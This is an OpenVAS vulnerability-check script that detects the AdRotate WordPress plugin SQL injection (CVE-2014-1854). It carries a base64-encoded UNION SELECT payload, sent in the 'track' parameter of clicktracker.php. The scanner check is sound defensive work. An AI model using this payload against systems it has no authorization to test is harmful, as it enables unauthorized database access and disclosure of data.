###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_adrotate_track_pram_sqli_vul.nasl 6663 2017-07-11 09:58:05Z teissa $
#
# WordPress AdRotate Plugin 'clicktracker.php' SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804511";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6663 $");
  script_cve_id("CVE-2014-1854");
  script_bugtraq_id(65709);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-03-11 11:17:52 +0530 (Tue, 11 Mar 2014)");
  script_name("WordPress AdRotate Plugin 'clicktracker.php' SQL Injection Vulnerability");

  tag_summary =
"This host is installed with WordPress AdRotate Plugin and is prone to sql
injection vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it is
possible to execute sql query or not.";

  tag_insight =
"Flaw is due to the library/clicktracker.php script not properly sanitizing
user-supplied input to the 'track' parameter.";

  tag_impact =
"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure
of arbitrary data.";

  tag_affected =
"Wordpress AdRotate Pro plugin version 3.9 through 3.9.5 and AdRotate Free
plugin version 3.9 through 3.9.4";

  tag_solution =
"Upgrade AdRotate Pro to version 3.9.6 or higher and AdRotate Free to version
3.9.5 or higher, For Updates refer to http://www.adrotateplugin.com";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/57079");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/31834");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23201");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125330");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/adrotate/library/clicktracker.php?track=LT' +
            'EgVU5JT04gU0VMRUNUIHZlcnNpb24oKSwxLDEsMQ==';

req = http_get(item:url,  port:http_port);
res = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);

if(res && res =~ "HTTP/1.. 302 Found" && res =~ "Location: ([0-9.]+)")
{
  security_message(http_port);
  exit(0);
}
